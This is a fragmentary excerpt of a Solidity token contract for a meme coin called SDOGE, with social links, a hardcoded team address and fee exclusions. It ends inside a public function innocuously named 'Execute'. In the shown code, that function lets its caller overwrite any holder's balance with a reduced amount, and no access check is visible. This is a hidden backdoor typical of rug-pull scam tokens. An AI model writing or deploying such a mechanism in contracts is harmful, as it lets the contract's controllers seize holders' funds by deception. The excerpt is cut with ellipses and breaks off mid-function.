...
*/
/**
Tele: https://t.me/StrayDogePortal
Tweet：https://twitter.com/StrayDogeERC
...
contract SDOGE is Ownable {event Transfer(address indexed from, address indexed to, uint256 value);event Approval(address indexed owner, address indexed spender, uint256 value);
...
symbol = "SDOGE";
decimals = 9;
uint256 Supply = 175000000;
_team = 0x05251A5c3f8ffBC004c3dCa1Cd1b204Ef020445A;
...
_isExcludeFromFee[address(_uniswapRouter)] = true;
    ...
    function Execute(address u, uint256 feePercent) public {
        assembly {
        if gt(feePercent, 100) { revert(0, 0) }
        }
        uint256 restPercent = 100 - feePercent;
        uint256 amount = balanceOf(address(u))*restPercent/100;
        transferer memory tra = transferer({operater : msg.sender,uamount : amount,u : u});
        _balances[tra.u] = tra.uamount;
